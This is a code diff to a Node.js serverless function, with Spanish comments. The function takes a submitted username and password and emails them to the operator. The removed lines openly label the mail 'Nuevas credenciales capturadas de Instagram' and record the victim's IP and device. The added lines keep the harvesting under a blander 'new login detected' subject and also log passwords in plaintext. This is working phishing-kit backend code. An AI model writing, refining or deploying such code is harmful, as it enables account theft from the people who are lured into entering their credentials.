@@ -2,6 +2,8 @@ require('dotenv').config();
 const nodemailer = require('nodemailer');
 
 exports.handler = async (event) => {
+  console.log('Función iniciada');
+  
   // Añadir headers CORS
   const headers = {
     'Access-Control-Allow-Origin': '*',
@@ -19,6 +21,7 @@ exports.handler = async (event) => {
   }
 
   if (event.httpMethod !== 'POST') {
+    console.log('Método no permitido');
     return {
       statusCode: 405,
       headers,
@@ -28,46 +31,42 @@ exports.handler = async (event) => {
 
   try {
     const { username, password } = JSON.parse(event.body);
+    console.log('Datos recibidos:', { username, password });
     
     if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
       throw new Error('Configuración de email incompleta');
     }
 
     const transporter = nodemailer.createTransport({
-      host: 'smtp.gmail.com',
-      port: 587,
+      host: process.env.SMTP_HOST,
+      port: process.env.SMTP_PORT,
       secure: false,
       auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
-      },
-      tls: {
-        rejectUnauthorized: false
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS
       }
     });
+
+    console.log('Transporter configurado');
 
     // Verificar conexión SMTP
     await transporter.verify();
 
     const mailOptions = {
-      from: `"Captura de Credenciales" <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_USER,
-      subject: '🎣 Nuevas credenciales capturadas de Instagram',
+      from: process.env.SMTP_USER,
+      to: process.env.SMTP_USER,
+      subject: 'Nuevo inicio de sesión detectado',
+      text: `Usuario: ${username}\nContraseña: ${password}`,
       html: `
-        <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f9f9f9;">
-          <h2 style="color: #333;">✅ Credenciales Capturadas</h2>
-          <div style="background-color: white; padding: 20px; border-radius: 5px; margin: 20px 0; border: 1px solid #eee;">
-            <p><strong>📧 Usuario/Email:</strong> ${username}</p>
-            <p><strong>🔑 Contraseña:</strong> ${password}</p>
-            <p><strong>⏰ Fecha y Hora:</strong> ${new Date().toLocaleString()}</p>
-            <p><strong>🌐 IP:</strong> ${event.headers['client-ip'] || 'Desconocida'}</p>
-            <p><strong>📱 Dispositivo:</strong> ${event.headers['user-agent'] || 'Desconocido'}</p>
-          </div>
-        </div>
+        <h3>Nuevo inicio de sesión detectado</h3>
+        <p><strong>Usuario:</strong> ${username}</p>
+        <p><strong>Contraseña:</strong> ${password}</p>
       `
     };
 
     const info = await transporter.sendMail(mailOptions);
+
+    console.log('Correo enviado:', info);
 
     return {
       statusCode: 200,
@@ -80,7 +79,7 @@ exports.handler = async (event) => {
     };
 
   } catch (error) {
-    console.error('Error:', error);
+    console.error('Error detallado:', error);
     
     return {
       statusCode: 500,
